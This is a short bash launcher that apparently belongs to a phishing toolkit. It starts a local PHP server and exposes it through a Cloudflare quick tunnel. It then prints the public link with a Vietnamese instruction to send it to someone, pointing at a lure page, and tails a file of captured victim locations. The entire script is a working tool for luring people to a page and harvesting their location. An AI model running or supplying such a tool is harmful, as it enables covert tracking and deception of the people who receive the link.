#!/bin/bash

cd "$(dirname "$0")"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
cloudflared tunnel --url http://localhost:8080 --no-autoupdate > .cloudflared.log 2>&1 &
sleep 5
url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' .cloudflared.log | head -n 1)
echo "[+] Gửi link này: $url/sites/image/index.html"
tail -f data/location.txt
